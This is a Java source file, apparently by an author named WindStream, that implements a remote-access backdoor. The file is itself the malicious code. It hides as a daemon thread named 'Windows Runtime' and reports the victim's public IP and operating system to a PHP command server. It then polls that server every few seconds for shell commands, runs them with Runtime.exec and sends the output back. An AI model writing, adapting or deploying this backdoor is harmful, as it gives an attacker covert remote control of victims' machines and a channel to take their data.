package net.wind.test;

import java.io.*;
import java.net.*;
import java.nio.charset.Charset;

/**
 * createTime 2022/10/15 0015
 * fileName payload
 *
 * @author WindStream
 */

public class payload extends Thread{
    public static String doGet(String URL){
        HttpURLConnection conn = null;
        InputStream is = null;
        BufferedReader br = null;
        StringBuilder result = new StringBuilder();
        try{
            java.net.URL url = new URL(URL);

            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            conn.setConnectTimeout(15000);
            conn.setReadTimeout(60000);
            conn.setRequestProperty("Accept", "application/json");

            conn.connect();
            if (200 == conn.getResponseCode()){
                is = conn.getInputStream();
                br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = br.readLine()) != null){
                    result.append(line);
                    //System.out.println(line);
                }
            }else{
                return "null";
            }
        }catch (MalformedURLException e){
            e.printStackTrace();
        }catch (IOException e){
            e.printStackTrace();
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            try{
                if(br != null){
                    br.close();
                }
                if(is != null){
                    is.close();
                }
            }catch (IOException ioe){
                ioe.printStackTrace();
            }
            conn.disconnect();
        }
        return result.toString();
    }
    private static String IP = "";
    private static int Port = 0;
    private static String phpClient = "";
    public void run() {
        String IP = doGet("http://ident.me/");
        String y_System = System.getProperty("os.name");
        String System = y_System.replace(" ","");
        doGet(phpClient+"/connectHost.php?ip="+IP);
        doGet(phpClient+"/ClientSystem.php?ip="+IP+"&system="+System);
        while(true) {
            try {
                Thread.sleep(5000);
                String com = doGet(phpClient+"/ClientReadServer.php?ip="+IP);
                InputStream inputStream = Runtime.getRuntime().exec(com).getInputStream();
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, "UTF-8");
                BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                String line = bufferedReader.readLine();
                String reply = "";
                while(line != null){
                    reply += line +"\n";
                    line = bufferedReader.readLine();
                }
                doGet(phpClient+"/ClientShelllReply.php?ip="+IP+"&reply="+reply);
                bufferedReader.close();
                inputStreamReader.close();
                inputStream.close();
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }

    //Main backDoor Program
    public static void backDoor(){
          payload payload = new payload();
          payload.setPriority(10);
          payload.setName("Windows Runtime");
          payload.setDaemon(true);
          payload.start();


    }
}
